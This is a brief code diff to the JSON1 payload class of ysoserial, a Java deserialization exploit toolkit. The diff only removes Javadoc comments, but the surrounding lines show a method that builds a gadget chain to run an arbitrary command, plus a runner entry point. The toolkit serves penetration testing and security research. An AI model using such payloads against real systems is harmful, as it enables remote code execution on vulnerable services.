@@ -67,11 +67,6 @@ import net.sf.json.JSONObject;
 } )
 public class JSON1 implements ObjectPayload<Object> {
 
-    /**
-     * {@inheritDoc}
-     *
-     * @see ysoserial.payloads.ObjectPayload#getObject(java.lang.String)
-     */
     public Map getObject ( String command ) throws Exception {
         return makeCallerChain(Gadgets.createTemplatesImpl(command), Templates.class);
     }
@@ -117,12 +112,6 @@ public class JSON1 implements ObjectPayload<Object> {
         return Gadgets.makeMap(t1, t2);
     }
 
-
-    /**
-     * 
-     * @param args
-     * @throws Exception
-     */
     public static void main ( final String[] args ) throws Exception {
         PayloadRunner.run(JSON1.class, args);
     }
